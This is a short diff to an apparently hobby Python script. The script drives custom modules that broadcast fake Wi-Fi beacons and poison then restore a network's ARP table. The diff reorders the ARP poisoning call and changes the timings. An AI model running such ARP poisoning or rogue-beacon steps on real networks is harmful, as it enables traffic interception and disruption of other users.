@@ -6,14 +6,15 @@ arp_attack = arp.Arp_poison(gu.get_pub_ip(), gu.get_default_gateway())
 
 mybeacon = beacon.Beacon()
 
-
-arp_attack.poison_arp_table()
 mybeacon.send(ssid="TEST", enc = True)
 mybeacon.send(ssid="TEST1", enc = False)
 mybeacon.send(ssid="TEST2", enc = True)
 mybeacon.send(ssid="TEST3")
 mybeacon.list()
 mybeacon.stop()
+mybeacon.list()
+time.sleep(5)
 mybeacon.stop_all()
-time.sleep(30)
+arp_attack.poison_arp_table()
+time.sleep(10)
 arp_attack.restore_arp_table()
